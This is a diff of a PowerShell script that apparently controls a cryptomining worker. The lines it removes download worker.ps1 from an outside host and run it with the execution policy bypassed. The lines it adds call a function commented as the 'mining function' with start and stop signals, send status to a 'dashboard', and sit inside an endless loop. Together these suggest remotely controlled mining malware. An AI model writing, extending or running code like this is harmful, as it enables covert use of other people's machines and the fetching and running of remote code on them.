@@ -151,44 +151,33 @@ function mit([string]$command) {
 
 
 function Swok{
-     Write-Host ¨called me¨
-    # If worker is already running, do nothing
+    Write-Host "called me"
+
+    # If worker already running, do nothing
     if ($WORKER) { return }
 
-    # Temporary directory for the worker
-    if (!(Test-Path $TEMP_DIR)) {
-        New-Item -ItemType Directory -Force -Path $TEMP_DIR | Out-Null
-    }
+    # Mark worker as running
+    $global:WORKER = $true
 
-    # Download the worker.ps1 from URL to TEMP_DIR
-    $workerUrl = "https://mcontrol.vercel.app/worker.ps1"
-    $workerFile = "$TEMP_DIR\worker.ps1"
+    # Call mining function with start signal
+    Mit -Start $true
 
-    Write-Host "Downloading worker from $workerUrl..."
-    Invoke-WebRequest -Uri $workerUrl -OutFile $workerFile -UseBasicParsing
-
-    # Start the worker.ps1 as a separate PowerShell process
-    $global:WORKER = Start-Process powershell `
-        -ArgumentList "-ExecutionPolicy Bypass -File `"$workerFile`"" `
-        -PassThru
-
-    Write-Host "Worker started with PID $($WORKER.Id)"
-    
-    # Optional: send "running" status to dashboard immediately
+    # Send running status to dashboard
     Send-Status $true
 }
 
-
 function Swnok {
 
-    if ($WORKER) {
-        Stop-Process -Id $WORKER.Id -Force
-        $global:WORKER = $null
-    }
+    Write-Host "Sending stop signal..."
 
-    if (Test-Path $TEMP_DIR) {
-        Remove-Item $TEMP_DIR -Recurse -Force
-    }
+    # If not running, do nothing
+    if (-not $WORKER) { return }
+
+    # Call Mit with stop command
+    Mit "stop"
+
+    # Mark worker as stopped
+    $global:WORKER = $null
 }
 
 while($true){
